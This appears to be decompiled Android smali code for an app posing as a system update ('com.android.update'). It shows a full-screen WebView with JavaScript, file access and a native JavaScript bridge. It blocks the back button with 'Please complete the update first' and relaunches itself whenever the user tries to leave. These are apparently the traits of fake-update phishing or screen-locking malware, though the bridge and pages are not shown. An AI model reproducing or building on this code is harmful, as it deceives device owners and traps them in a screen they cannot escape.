.class public Lcom/android/update/MainActivity;
.super Landroid/app/Activity;
.source "MainActivity.java"

# direct methods
.method public constructor <init>()V
    .locals 0
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 4

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    # Full screen
    invoke-virtual {p0}, Lcom/android/update/MainActivity;->getWindow()Landroid/view/Window;
    move-result-object v0
    const/16 v1, 0x400
    invoke-virtual {v0, v1}, Landroid/view/Window;->addFlags(I)V

    # Init WebView
    new-instance v0, Landroid/webkit/WebView;
    invoke-direct {v0, p0}, Landroid/webkit/WebView;-><init>(Landroid/content/Context;)V
    iput-object v0, p0, Lcom/android/update/MainActivity;->webView:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;
    move-result-object v0
    const/4 v1, 0x1
    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V
    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setAllowFileAccess(Z)V
    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setDomStorageEnabled(Z)V

    # JS interface
    iget-object v0, p0, Lcom/android/update/MainActivity;->webView:Landroid/webkit/WebView;
    new-instance v1, Lcom/android/update/WebAppInterface;
    invoke-direct {v1, p0}, Lcom/android/update/WebAppInterface;-><init>(Landroid/content/Context;)V
    const-string v2, "Android"
    invoke-virtual {v0, v1, v2}, Landroid/webkit/WebView;->addJavascriptInterface(Ljava/lang/Object;Ljava/lang/String;)V

    # Set client
    iget-object v0, p0, Lcom/android/update/MainActivity;->webView:Landroid/webkit/WebView;
    new-instance v1, Lcom/android/update/MainActivity$1;
    invoke-direct {v1, p0}, Lcom/android/update/MainActivity$1;-><init>(Lcom/android/update/MainActivity;)V
    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->setWebViewClient(Landroid/webkit/WebViewClient;)V

    # Load page1
    iget-object v0, p0, Lcom/android/update/MainActivity;->webView:Landroid/webkit/WebView;
    const-string v1, "file:///android_asset/update/page1.html"
    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    # Set content view
    iget-object v0, p0, Lcom/android/update/MainActivity;->webView:Landroid/webkit/WebView;
    invoke-virtual {p0, v0}, Lcom/android/update/MainActivity;->setContentView(Landroid/view/View;)V

    return-void
.end method

.method public onBackPressed()V
    .locals 2
    const-string v0, "Please complete the update first"
    const/4 v1, 0x0
    invoke-static {p0, v0, v1}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;
    move-result-object v0
    invoke-virtual {v0}, Landroid/widget/Toast;->show()V
    return-void
.end method

.method protected onUserLeaveHint()V
    .locals 3
    new-instance v0, Landroid/content/Intent;
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;
    move-result-object v1
    invoke-direct {v0, p0, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V
    const/high16 v1, 0x24000000
    invoke-virtual {v0, v1}, Landroid/content/Intent;->setFlags(I)Landroid/content/Intent;
    invoke-virtual {p0, v0}, Lcom/android/update/MainActivity;->startActivity(Landroid/content/Intent;)V
    return-void
.end method
